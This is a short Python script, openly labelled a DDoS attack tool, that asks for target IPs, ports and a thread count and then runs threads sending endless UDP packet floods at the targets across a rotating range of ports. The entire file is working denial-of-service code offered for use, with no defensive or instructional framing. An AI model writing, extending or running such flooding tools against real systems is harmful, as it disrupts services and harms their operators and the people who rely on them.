import os
import time
import socket
import scapy.all as scapy
import threading

def display_banner():
    banner =  "██████╗ ██████╗  ██████╗ ███████╗       █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗\n"
    banner += "██╔══██╗██╔══██╗██╔═══██╗██╔════╝      ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝\n"
    banner += "██║  ██║██║  ██║██║   ██║███████╗█████╗███████║   ██║      ██║   ███████║██║     █████╔╝\n"
    banner += "██║  ██║██║  ██║██║   ██║╚════██║╚════╝██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗\n"
    banner += "██████╔╝██████╔╝╚██████╔╝███████║      ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗\n"
    banner += "╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝      ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\n"
    print(banner)

def send_packets(ip, port, data, proxy_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    while True:
        for i in range(proxy_size):
            sock.sendto(data, (ip, port))
            sent += 1
            port += 1
            if port == 65534:
                port = 1

def run_ddos_attack():
    display_banner()

    # Terminal header settings and information
    os.system('color 0A' if os.name == 'nt' else '')
    
    print()

    # Lets define sock and bytes for our attack
    ips = input("IP Targets (separated by commas): ").split(',')
    ports = input("Ports (separated by commas): ").split(',')
    proxy_size = int(input("Proxy Size : "))
    threads = int(input("Number of threads : "))

    # Lets start the attack
    print("Thank you for using the KARTHIK-LAL (DDOS-ATTACK-TOOL).")
    time.sleep(3)
    
    for ip in ips:
        for port in ports:
            data = b'Hello, this is a DDOS attack'
            print(f"Starting the attack on {ip} at port {port} with a proxy size of {proxy_size}...")
            for i in range(threads):
                t = threading.Thread(target=send_packets, args=(ip, int(port), data, proxy_size))
                t.start()           

    input("Press Enter to exit...")

if __name__ == "__main__":
    run_ddos_attack()
